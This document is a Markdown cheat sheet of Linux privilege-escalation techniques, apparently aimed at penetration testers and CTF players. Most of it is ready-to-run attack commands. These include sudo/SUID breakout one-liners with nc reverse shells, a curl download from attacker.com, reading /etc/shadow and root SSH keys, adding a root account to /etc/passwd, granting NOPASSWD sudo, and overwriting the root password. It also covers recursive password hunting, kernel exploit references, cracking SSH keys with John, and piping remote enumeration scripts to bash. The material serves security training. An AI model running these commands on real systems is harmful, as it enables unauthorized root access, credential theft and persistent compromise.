# Linux-Privilege-Escalation

<!-- TOC -->
- [Linux-Privilege-Escalation](#linux-privilege-escalation)
  - [Fix the Shell](#fix-the-shell)
  - [Start with the basics](#start-with-the-basics)
  - [What can we EXECUTE?](#what-can-we-execute)
  - [What can we READ?](#what-can-we-read)
  - [Where can we WRITE?](#where-can-we-write)
  - [Password Hunting](#password-hunting)
  - [Kernel Exploits](#kernel-exploits)
  - [Automated Linux Enumeration Scripts](#automated-linux-enumeration-scripts)
    - [LinEmum.sh](#linemumsh)
  - [CTF Machine Tactics](#ctf-machine-tactics)
  - [Using SSH Keys](#using-ssh-keys)
  - [Methodology - Linux Checklist](#methodology---linux-checklist)
  - [Following the path to Enumerating Linux](#following-the-path-to-enumerating-linux)
  - [References](#references)
<!-- /TOC -->

Tips and Tricks for Linux Priv Escalation

## Fix the Shell

```shell
python -c 'import pty; pty.spawn("/bin/bash")'

### BELOW IS OPTIONAL; YOU CAN TRY THAT #######
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp
export TERM=xterm-256color
alias ll='ls -lsaht --color=auto'
### Optional Stuff above #####

# Then go for backgrounding the process with keyboard shortcut: 
Ctrl-Z

# In Kali Note the number of rows and cols in the current terminal window
$ stty -a

# Next we will enable raw echo so we can use TAB autocompletes
# stty raw -echo
# fg
stty raw -echo ; fg ; reset ; stty raw -echo ; fg ; reset

# In reverse shell
#$ stty rows <num> columns <cols>
stty columns 200 rows 200

# Finally
#$ reset
#$ export SHELL=bash
#$ export TERM=xterm-256color
```

## Start with the basics

Check **who** you are, which **privileges** do you have, which **users** are in the systems, which ones can **login** and which ones have **root privileges:**  

  ```shell
  #Info about me  Who am i and what groups do I belong to?
  id || (whoami && groups) 2>/dev/null  
  #List all users  
  cat /etc/passwd | cut -d: -f1  
  #List users with console  
  cat /etc/passwd | grep "sh$"  
  #List superusers  
  awk -F: '($3 == "0") {print}' /etc/passwd  
  #Currently logged users  
  w
  #Login history  
  last | tail  
  #Last log of each user  
  lastlog  
  #List all users and their groups  
  for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done
  2>/dev/null | sort  
  #Current user PGP keys  
  gpg --list-keys 2&gt;/dev/null

  #Who else is on this box (lateral movement)?
  ls -la /home
  cat /etc/passwd
  ```

What Kernel version and distro are we working with here?
  `uname -a`
  `cat /etc/issue`

What new processes are running on the server (Thanks to IPPSEC for the script!):

```shell
#!/bin/bash

# Loop by line
IFS=$'\n'

old_process=$(ps aux --forest | grep -v "ps aux --forest" | grep -v "sleep 1" | grep -v $0)

while true; do
  new_process=$(ps aux --forest | grep -v "ps aux --forest" | grep -v "sleep 1" | grep -v $0)
  diff <(echo "$old_process") <(echo "$new_process") | grep [\<\>]
  sleep 1
  old_process=$new_process
done
```

We can also use pspy on linux to monitor the processes that are starting up and running: <https://github.com/DominicBreuker/pspy>
Check the services that are listening: `bash ss -lnpt`

## What can we EXECUTE?

Who can execute code as root (probably will get a permission denied)?
  `cat /etc/sudoers`
Can I execute code as root (you will need the user's password)?
  `sudo -l`

What executables have SUID bit that can be executed as another user?

  ```shell
  find / -type f -user root -perm /u+s -ls 2>/dev/null
  find / -user root -perm -4000 -print 2>/dev/null
  find / -perm -u=s -type f 2>/dev/null
  find / -user root -perm -4000 -exec ls -ldb {};
  ```

Do you have any capabilities available?

  ```shell
  getcap -r / 2>/dev/null
  ```

Do any of the SUID binaries run commands that are vulnerable to file path manipulation?

  ```shell
  strings /usr/local/bin/binaryelf
  mail
  echo "/bin/sh" > /tmp/mail cd /tmp
  export PATH=.
  /usr/local/bin/binaryelf
  ```

Do any of the SUID binaries run commands that are vulnerable to Bash Function Manipulation?

 ```shell
  strings /usr/bin/binaryelf
  mail function /usr/bin/mail() { /bin/sh; }
  export -f /usr/bin/mail
  /usr/bin/binaryelf
  ```

Can I write files into a folder containing a SUID bit file?
Might be possible to take advantage of a '.' in the PATH or an The IFS (or Internal Field Separator) Exploit.

If any of the following commands appear on the list of SUID or SUDO commands, they can be used for privledge escalation:

| SUID / SUDO Executables               | Priv Esc Command (will need to prefix with sudo if you are using sudo for priv esc. |
|---------------------------------------|-------------------------------------------------------------------------------------|
| (ALL : ALL ) ALL                      | You can run any command as root.<br> sudo su - <br> sudo /bin/bash                    |
| nmap <br> (older versions 2.02 to 5.21)  | nmap --interactive <br> !sh                                                           |
| netcat <br> nc <br> nc.traditional          | nc -nlvp 4444 & <br> nc -e /bin/bash 127.0.0.1 4444                                  |
| ncat                                  |                                                                                     |
| awk <br> gawk                            | awk '{ print }' /etc/shadow <br> awk 'BEGIN {system("id")}'                         |
| python                                | python -c 'import pty;pty.spawn("/bin/bash")'                                       |
| php                                   |  CMD="/bin/sh" sudo php -r "system('$CMD');"                                        |
| find                                  | find /home -exec nc -lvp 4444 -e /bin/bash; <br> find /home -exec /bin/bash;           |
| xxd                                   | LFILE=file_to_read sudo xxd "$LFILE" | xxd -r                                       |
| vi                                    | sudo vi -c ':!/bin/sh' /dev/null                                                    |
| more                                  | TERM= sudo more /etc/profile <br> !/bin/sh                                         |
| less                                  | sudo less /etc/profile <br> !/bin/sh                                               |
| nano                                  | sudo nano <br> ^R^X <br> reset; sh 1>&0 2>&0                                       |
| cp                                    | sudo cp /bin/sh /bin/cp <br> sudo cp                                               |
| cat                                   | LFILE=file_to_read <br> sudo cat "$LFILE"                                          |
| bash                                  | sudo bash                                                                          |
| ash                                  |  sudo ash                                                                           |
| sh                                   | |
| csh                                  | |
| curl                                 | URL=<http://attacker.com/file_to_get> <br> LFILE=file_to_save <br> sudo curl $URL -o $LFILE |
| dash                                 | |
| pico                                 | sudo pico <br> ^R^X <br> reset; sh 1>&0 2>&0                                         |
| nano                                 |  sudo nano <br> ^R^X <br> reset; sh 1>&0 2>&0                                        |
| tclsh                                | sudo tclsh <br> exec /bin/sh <@stdin >@stdout 2>@stderr                              |
| git                                  | sudo PAGER='sh -c "exec sh 0<&1"' git -p help <br> or <br> sudo git -p help config <br> !/bin/sh |
| scp                                  | TF=$(mktemp) <br> echo `'sh 0<&2 1>&2' > $TF` <br> chmod +x "$TF" <br> sudo scp -S $TF x y: |
| expect                               | sudo expect -c 'spawn /bin/sh;interact'                                              |
| ftp                                  | sudo ftp <br> !/bin/sh                                                               |
| socat                                | sudo socat stdin exec:/bin/sh                                                        |
| script                               | sudo script -q /dev/null                                                             |
| ssh                                  | sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x                                           |
| zsh                                  | sudo zsh                                                                             |
| tclsh                                | sudo tclsh <br> exec /bin/sh <@stdin >@stdout 2>@stderr                              |
| strace                               |  Write and compile a a SUID SUID binary c++ program <br> strace chown root:root suid <br> strace chmod u+s suid <br> ./suid        |
| npm                                  |  ln -s /etc/shadow package.json && sudo /usr/bin/npm i *                            |
| rsync                                |                                                                                     |
| tar                                  |                                                                                     |
|Screen-4.5.00     | <https://www.exploit-db.com/exploits/41154/>        |

*Note:* You can find an incredible list of Linux binaries that can lead to privledge escalation at the GTFOBins project website here: <https://gtfobins.github.io/>

Can I access services that are running as root on the local network?

```shell
netstat -antup
ps -aux | grep root
```

| Network Services Running as Root      | Exploit actions                                                                     |
|---------------------------------------|-------------------------------------------------------------------------------------|
| mysql                                 | raptor_udf2 exploit <br> 0xdeadbeef.info/exploits/raptor_udf2.c <br> insert into foo values(load_file('/home/smeagol/raptor_udf2.so'));                   |
| apache            | drop a reverse shell script on to the webserver                                     |
| nfs             | no_root_squash parameter <br> Or <br> if you create the same user name and matching user id as the remote share you can gain access to the files and write new files to the share  |
| PostgreSQL                            | <https://www.exploit-db.com/exploits/45184/>                                          |

Are there any active tmux sessions we can connect to? `tmux ls`

## What can we READ?

What files and folders are in my home user's directory? `ls -la ~`
Do any users have passwords stored in the passwd file? `cat /etc/passwd`
Are there passwords for other users or RSA keys for SSHing into the box? `ssh -i id_rsa root@10.10.10.10`

Are there configuration files that contain credentials?

| Application and config file           | Config File Contents                                                                |
|---------------------------------------|-------------------------------------------------------------------------------------|
| WolfCMS <br> config.php               | // Database settings: <br> define('DB_DSN', 'mysql:dbname=wolf;host=localhost;port=3306'); <br> define('DB_USER', 'root'); <br> define('DB_PASS', 'john@123');<br>        |
| Generic PHP Web App                   | define('DB_PASSWORD', 's3cret');                                                     |
| .ssh directory           | authorized_keys <br> id_rsa <br> id_rsa.keystore <br> id_rsa.pub <br> known_hosts            |
| User MySQL Info                 | .mysql_history <br> .my.cnf                     |
| User Bash History                  | .bash_history                                      |

Are any of the discovered credentials being reused by multiple acccounts?
  `sudo - username`
  `sudo -s`

Are there any Cron Jobs Running? `cat /etc/crontab`

What files have been modified most recently?

  ```shell
  find /etc -type f -printf '%TY-%Tm-%Td %TT %p\n' | sort -r
  find /home -type f -mmin -60
  find / -type f -mtime -2
  ```

Is the user a member of the Disk group and can we read the contents of the file system?
  
  ```shell
  debugfs /dev/sda
  debugfs: cat /root/.ssh/id_rsa
  debugfs: cat /etc/shadow
  ```

Is the user a member of the Video group and can we read the Framebuffer?
  
  ```shell
  cat /dev/fb0 > /tmp/screen.raw
  cat /sys/class/graphics/fb0/virtual_size
  ```

## Where can we WRITE?

What are all the files can I write to?
  `find / -type f -writable -path /sys -prune -o -path /proc -prune -o -path /usr -prune -o -path /lib -prune -o -type d 2>/dev/null`

What folder can I write to?
  `find / -regextype posix-extended -regex "/(sys|srv|proc|usr|lib|var)" -prune -o -type d -writable 2>/dev/null`

| Writable Folder / file    | Priv Esc Command                                                                                |
|---------------------------|-------------------------------------------------------------------------------------------------|
| /home/*USER*/             | Create an ssh key and copy it to the .ssh/authorized_keys folder the ssh into the account       |
| /etc/passwd               | manually add a user with a password of "password" using the following syntax <br> user:$1$xtTrK/At$Ga7qELQGiIklZGDhc6T5J0:1000:1000:,,,:/home/user:/bin/bash <br> You can even escalate to the root user in some cases with the following syntax: <br> above admin:$1$xtTrK/At$Ga7qELQGiIklZGDhc6T5J0:0:0:,,,:/root:/bin/bash                         |

_Root SSH Key_ If Root can login via SSH, then you might be able to find a method of adding a key to the /root/.ssh/authorized_keys file.

`cat /etc/ssh/sshd_config | grep PermitRootLogin`

_Add SUDOers_ If we can write arbitrary files to the host as Root, it is possible to add users to the SUDO-ers group like so (NOTE: you will need to logout and login again as myuser): `/etc/sudoers`

```shell
root    ALL=(ALL:ALL) ALL
%sudo   ALL=(ALL:ALL) ALL
myuser    ALL=(ALL) NOPASSWD:ALL
```

_Set Root Password_ We can also change the root password on the host if we can write to any file as root:`/etc/shadow`

```shell
printf root:>shadown
openssl passwd -1 -salt salty password >>shadow
```

## Password Hunting

```shell
grep --color=auto -rnw ‘/’ -ie “PASSWORD” --color=always 2>/dev/null  
grep --color=auto -rnw ‘/’ -ie “PASSWORD=” --color=always 2>/dev/null  
```

<https://linuxcommando.blogspot.com/2007/10/grep-with-color-output.html>  

```shell
locate password | more  
locate passw | more  
locate pass | more  
```

```shell
find / -name authorized_keys  
find / -name id_rsa 2>/dev/null  
```

## Kernel Exploits

Based on the Kernel version, do we have some reliable exploits that can be used?

| Kernel Version                                                                       | Reliable exploit                               |
|--------------------------------------------------------------------------------------|------------------------------------------------|
| UDEV - Linux Kernel < 2.6 & UDEV < 1.4.1 - CVE-2009-1185 - April 2009                | Ubuntu 8.10, Ubunto 9.04, Gentoo               |
| RDS - Linux Kernel <= 2.6.36-rc8 - CVE-2010-3904 - Linux Exploit -                   | Centos 4/5                                     |
| perf_swevent_init - Linux Kernel < 3.8.9 (x86-64) - CVE-2013-2094 - June 2013        | Ubuntu 12.04.2                                 |
| mempodipper - Linux Kernel 2.6.39 < 3.2.2 (x86-64) - CVE-2012-0056 - January 2012    | Ubuntu 11.10, Ubuntu 10.04, Redhat 6, Oracle 6 |
| Dirty Cow - Linux Kernel 2.6.22 < 3.2.0/3.13.0/4.8.3 - CVE-2016-5195 - October 2016  | Ubuntu 12.04, Ubuntu 14.04, Ubuntu 16.04       |
| KASLR / SMEP - Linux Kernel < 4.4.0-83 / < 4.8.0-58 - CVE-2017-1000112 - August 2017 | Ubuntu 14.04, Ubuntu 16.04                     |

Great list here: <https://github.com/lucyoa/kernel-exploits>

## Automated Linux Enumeration Scripts

It is always a great idea to automate the enumeration process once you understand what you are looking for.

### LinEmum.sh

LinEnum is a handy method of automating Linux enumeration. It is also written as a shell script and does not require any other intpreters (Python,PERL etc.) which allows you to run it file-lessly in memory.

First we need to git a copy to our local Kali linux machine:

  `git clone https://github.com/rebootuser/LinEnum.git`

Next we can serve it up in the python simple web server:

```shell
root@kali:~test# cd LinEnum/
root@kali:~test/LinEnum# ls
root@kali:~test/LinEnum# python -m SimpleHTTPServer 80
Serving HTTP on 0.0.0.0 port 80 ...
```

And now on our remote Linux machine we can pull down the script and pipe it directly to Bash:
  `www-data@vulnerable:/var/www$ curl 10.10.10.10/LinEnum.sh | bash`
And the enumeration script should run on the remote machine.

## CTF Machine Tactics

Often it is easy to identify when a machine was created by the date / time of file edits. We can create a list of all the files with a modify time in that timeframe with the following command:

`find -L /  -type f -newermt 2019-08-24 ! -newermt 2019-08-27 2>&1 > /tmp/foundfiles.txt`

This has helped me to find interesting files on a few different CTF machines. Recursively searching for passwords is also a handy technique:
  `grep -ri "passw" .`

- Wget Pipe a remote URL directory to Bash (linpeas):

  `wget -q -O - "http://10.10.10.10/linpeas.sh" | bash`

- Curl Pipe a remote URL directly to Bash (linpeas):

  `curl -sSk "http://10.10.10.10/linpeas.sh" | bash`

## Using SSH Keys

Often, we are provided with password protected SSH keys on CTF boxes. It it helpful to be able to quicky crack and add these to your private keys.

- First we need to convert the ssh key using John:

  `kali@kali:~/.ssh$ /usr/share/john/ssh2john.py ./id_rsa > ./id_rsa_john...`

- Next we will need to use that format to crack the password:

  `/usr/sbin/john --wordlist=/usr/share/wordlists/rockyou.txt ./id_rsa_john`

- John should output a password for the private key.

## Methodology - Linux Checklist

- Kernel and distribution release details

- System Information:

  - [ ] Hostname
  - [ ] Networking details:
  - [ ] Current IP
  - [ ] Default route details
  - [ ] DNS server information

- User Information:

  - [ ] Current user details
  - [ ] Last logged on users
  - [ ] Shows users logged onto the host
  - [ ] List all users including uid/gid information
  - [ ] List root accounts
  - [ ] Extracts password policies and hash storage method information
  - [ ] Checks umask value
  - [ ] Checks if password hashes are stored in /etc/passwd
  - [ ] Extract full details for 'default' uid's such as 0, 1000, 1001 etc
  - [ ] Attempt to read restricted files i.e. /etc/shadow
  - [ ] List current users history files (i.e .bash_history, .nano_history, .mysql_history , etc.)
  - [ ] Basic SSH checks

- Privileged access:

  - [ ] Which users have recently used sudo
  - [ ] Determine if /etc/sudoers is accessible
  - [ ] Determine if the current user has Sudo access without a password
  - [ ] Are known 'good' breakout binaries available via Sudo (i.e. nmap, vim etc.)
  - [ ] Is root's home directory accessible
  - [ ] List permissions for /home/

- Environmental:

  - [ ] Display current $PATH
  - [ ] Displays env information

- Jobs/Tasks:

  - [ ] List all cron jobs
  - [ ] Locate all world-writable cron jobs
  - [ ] Locate cron jobs owned by other users of the system
  - [ ] List the active and inactive systemd timers

- Services:

  - [ ] List network connections (TCP & UDP)
  - [ ] List running processes
  - [ ] Lookup and list process binaries and associated permissions
  - [ ] List inetd.conf/xined.conf contents and associated binary file permissions
  - [ ] List init.d binary permissions

- Version Information (of the following):

  - [ ] Sudo
  - [ ] MYSQL
  - [ ] Postgres

- Apache

  - [ ] Checks user config
  - [ ] Shows enabled modules
  - [ ] Checks for htpasswd files
  - [ ] View www directories

- Default/Weak Credentials:

  - [ ] Checks for default/weak Postgres accounts
  - [ ] Checks for default/weak MYSQL accounts

- Searches:

  - [ ] Locate all SUID/GUID files
  - [ ] Locate all world-writable SUID/GUID files
  - [ ] Locate all SUID/GUID files owned by root
  - [ ] Locate 'interesting' SUID/GUID files (i.e. nmap, vim etc)
  - [ ] Locate files with POSIX capabilities
  - [ ] List all world-writable files
  - [ ] Find/list all accessible *.plan files and display contents
  - [ ] Find/list all accessible *.rhosts files and display contents
  - [ ] Show NFS server details
  - [ ] Locate _.conf and_ .log files containing keyword supplied at script runtime
  - [ ] List all *.conf files located in /etc
  - [ ] Locate mail

- Platform/software specific tests:

  - [ ] Checks to determine if we're in a Docker container
  - [ ] Checks to see if the host has Docker installed
  - [ ] Checks to determine if we're in an LXC container

## Following the path to Enumerating Linux

<https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/>
<https://sirensecurity.io/blog/linux-privilege-escalation-resources/>
<https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS>

## References

<https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/>
<http://www.hackingarticles.in/linux-privilege-escalation-using-exploiting-sudo-rights/>
<https://payatu.com/guide-linux-privilege-escalation/>
<http://www.hackingarticles.in/editing-etc-passwd-file-for-privilege-escalation/>
<http://www.0daysecurity.com/penetration-testing/enumeration.html>
<https://www.rebootuser.com/?p=1623#.V0W5Pbp95JP>
<https://www.doomedraven.com/2013/04/hacking-linux-part-i-privilege.html>
<https://securism.wordpress.com/oscp-notes-privilege-escalation-linux/>
<https://haiderm.com/linux-privilege-escalation-using-weak-nfs-permissions/>
<http://hackingandsecurity.blogspot.com/2016/06/exploiting-network-file-system-nfs.html>
<https://www.defensecode.com/public/DefenseCode_Unix_WildCards_Gone_Wild.txt> <https://hkh4cks.com/blog/2017/12/30/linux-enumeration-cheatsheet/>
<https://digi.ninja/blog/when_all_you_can_do_is_read.php>
[https://medium.com/@D00MFist/vulnhub-lin-security-1-d9749ea645e2](mailto:<https://medium.com/@D00MFist/> vulnhub-lin-security-1-d9749ea645e2)
<https://gtfobins.github.io/>
<https://github.com/rebootuser/LinEnum>
